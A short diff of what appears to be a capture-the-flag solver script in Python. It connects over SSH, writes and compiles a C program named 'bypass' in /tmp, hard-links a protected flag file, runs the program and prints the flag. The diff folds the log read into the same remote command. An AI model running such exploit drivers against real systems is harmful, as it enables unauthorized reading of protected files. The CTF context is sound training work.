@@ -130,13 +130,11 @@ cd /tmp; echo '
         }
         return 0;
     }
-' > bypass.c; gcc bypass.c -o bypass; chmod +x bypass; ln /home/input/flag flag; ./bypass > bypass.log;
+' > bypass.c; gcc bypass.c -o bypass; chmod +x bypass; ln /home/input/flag flag; ./bypass > bypass.log; cat bypass.log;
 ''' 
 
 s = ssh(user, host, port, passwd)
-s.run_to_end(bypass)
-sleep(5)
-flag, status = s.run_to_end('cat /tmp/bypass.log;')
+flag, status = s.run_to_end(bypass)
 print '[+] Flag:', flag
 s.close()
 
